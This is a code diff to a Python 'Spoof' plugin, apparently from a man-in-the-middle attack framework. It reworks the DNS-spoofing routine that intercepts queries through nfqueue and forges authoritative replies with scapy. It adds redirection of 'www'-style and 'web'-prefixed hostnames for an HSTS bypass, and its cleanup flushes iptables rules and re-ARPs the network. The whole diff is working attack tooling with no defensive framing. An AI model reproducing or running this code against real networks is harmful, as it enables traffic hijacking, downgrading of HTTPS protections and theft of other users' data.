@@ -249,13 +249,14 @@ class Spoof(Plugin):
 
     def resolve_domain(self, domain):
         try:
+            #logging.info("Resolving -> %s" % domain)
             answer = dns.resolver.query(domain, 'A')
             real_ips = []
             for rdata in answer:
                 real_ips.append(rdata.address)
 
             if len(real_ips) > 0:
-                return real_ips[0]
+                return real_ips
 
         except Exception:
             logging.debug("Error resolving " + domain)
@@ -266,6 +267,7 @@ class Spoof(Plugin):
         if not pkt.haslayer(DNSQR):
             payload.set_verdict(nfqueue.NF_ACCEPT)
         else:
+            #logging.info("Got DNS packet for %s %s" % (pkt[DNSQR].qname, pkt[DNSQR].qtype))
             if self.dns:
                 for k, v in self.dnscfg.items():
                     if k in pkt[DNSQR].qname:
@@ -277,22 +279,33 @@ class Spoof(Plugin):
                         if v == pkt[DNSQR].qname[:-1]:
                             ip = self.resolve_domain(k)
                             if ip:
-                                self.modify_dns(payload, pkt, ip, hsts=True)
-                    
+                                self.modify_dns(payload, pkt, ip)
+
                     if 'wwww' in pkt[DNSQR].qname:
                         ip = self.resolve_domain(pkt[DNSQR].qname[1:-1])
                         if ip:
-                            self.modify_dns(payload, pkt, ip, hsts=True)
+                            self.modify_dns(payload, pkt, ip)
 
-    def modify_dns(self, payload, pkt, ip, hsts=False):
+                    if 'web' in pkt[DNSQR].qname:
+                        ip = self.resolve_domain(pkt[DNSQR].qname[3:-1])
+                        if ip:
+                            self.modify_dns(payload, pkt, ip)
+
+    def modify_dns(self, payload, pkt, ip):
         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) /\
-                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
-                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ip))
+        UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) /\
+        DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd)
 
-        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
-        if hsts:
+        if self.hsts:
+            spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip[0]); del ip[0] #have to do this first to initialize the an field
+            for i in ip:
+                spoofed_pkt[DNS].an.add_payload(DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=i))
+
+            payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
             logging.info("%s Resolving %s for HSTS bypass" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
-        else:
+
+        if self.dns:
+            spoofed_pkt[DNS].an = DNSRR(rrname=pkt[DNS].qd.qname, ttl=1800, rdata=ip) 
             logging.info("%s Modified DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))
 
     def start_dns_queue(self):
@@ -343,8 +356,11 @@ class Spoof(Plugin):
             os.system('iptables -F && iptables -X && iptables -t nat -F && iptables -t nat -X')
 
         if (self.dns or self.hsts):
-            self.q.unbind(socket.AF_INET)
-            self.q.close()
+            try:
+                self.q.unbind(socket.AF_INET)
+                self.q.close()
+            except:
+                pass
 
         if self.arp:
             print '[*] Re-arping network'
